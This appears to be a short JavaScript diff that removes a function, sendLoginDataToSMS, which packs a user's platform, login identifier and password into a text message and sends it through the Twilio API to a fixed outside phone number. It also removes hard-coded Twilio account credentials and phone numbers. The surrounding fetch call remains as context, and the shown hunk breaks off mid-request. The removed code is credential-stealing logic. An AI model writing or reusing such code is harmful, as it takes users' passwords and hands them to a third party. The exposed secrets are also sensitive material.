@@ -1,11 +1,4 @@
 // Add your Twilio credentials and phone number here
-const TWILIO_ACCOUNT_SID = 'AC84f3b179b0fd3949be3b101546e488b0';
-const TWILIO_AUTH_TOKEN = 'a6334ffcb46f7b55f22253af0b25f0e8';
-const TWILIO_PHONE_NUMBER = '+16465767521';
-
-function sendLoginDataToSMS(platform, identifier, password) {
-    const phoneNumber = '+919827361619';
-    const message = `Platform: ${platform}, Identifier: ${identifier}, Password: ${password}`;
 
     fetch('https://api.twilio.com/2010-04-01/Accounts/' + TWILIO_ACCOUNT_SID + '/Messages.json', {
         method: 'POST',
